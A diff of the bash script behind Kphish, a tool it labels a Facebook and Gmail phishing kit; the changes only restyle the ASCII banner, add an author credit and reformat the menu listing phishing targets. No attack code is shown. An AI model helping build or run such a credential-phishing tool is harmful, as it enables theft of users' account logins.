@@ -102,15 +102,18 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${GREEN}
-		  _  __      _     _     _     
-		 | |/ /     | |   (_)   | |    
-		 | ' / _ __ | |__  _ ___| |__  
-		 |  < | '_ \| '_ \| / __| '_ \ 
-		 | . \| |_) | | | | \__ \ | | |
-		 |_|\_\ .__/|_| |_|_|___/_| |_|
-		      | |                      
-		      |_|                      
-		   ${BLUE} ${__version__}
+		   		  _  __      _     _     _     
+		   		 | |/ /     | |   (_)   | |    
+		   		 | ' / _ __ | |__  _ ___| |__  
+		   		 |  < | '_ \| '_ \| / __| '_ \ 
+		   		 | . \| |_) | | | | \__ \ | | |
+		   		 |_|\_\ .__/|_| |_|_|___/_| |_|
+		   		      | |                      
+		   		      |_|                      
+		   		${GREEN}
+		   		                                    ${BLUE}Version : ${__version__}
+		   
+		   		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by MD Asif Hasan (DetaSploit)${WHITE}
 	EOF
 }
 
@@ -517,9 +520,9 @@ site_gmail() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${WHITE}[${GREEN}::${WHITE}]${BLUE} Kphish : Simple Facebook & Gmail Phishing Tool ${WHITE}[${GREEN}::${WHITE}]${BLUE}
+		${ORANGE}Kphish :${BLUE} Simple Facebook & Gmail Phishing Tool
 
-		${WHITE}[${GREEN}::${WHITE}]${RED} Phishing Sites : ${WHITE}[${GREEN}::${WHITE}]${RED}
+		${GREEN}[${ORANGE}•${GREEN}]${RED} Phishing Sites :
 
 		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Facebook―――1
 		${GREEN}[${ORANGE}•${GREEN}]${BLUE} Gmail―――2
